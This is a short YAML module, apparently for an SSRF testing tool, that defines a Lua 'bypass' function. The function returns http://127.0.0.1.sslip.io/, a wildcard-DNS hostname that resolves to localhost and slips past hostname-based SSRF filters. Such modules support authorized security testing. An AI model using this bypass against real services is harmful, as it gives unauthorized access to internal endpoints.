meta:
  id: sslip_io
  version: 1
  name: "sslip.io DNS Wildcard"
  description: "Uses sslip.io to resolve to IP"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-06-19"
  rank: 75
  confidence: 85
  severity: high
  tags: [dns, wildcard, sslip]
  references: []
match:
  schemes: [http, https]
  requires: [hostname]
  supports: [dns]
script:
  language: lua
  entry: bypass
  source: |
    function bypass(ctx)
      return { url = "http://127.0.0.1.sslip.io/" }
    end
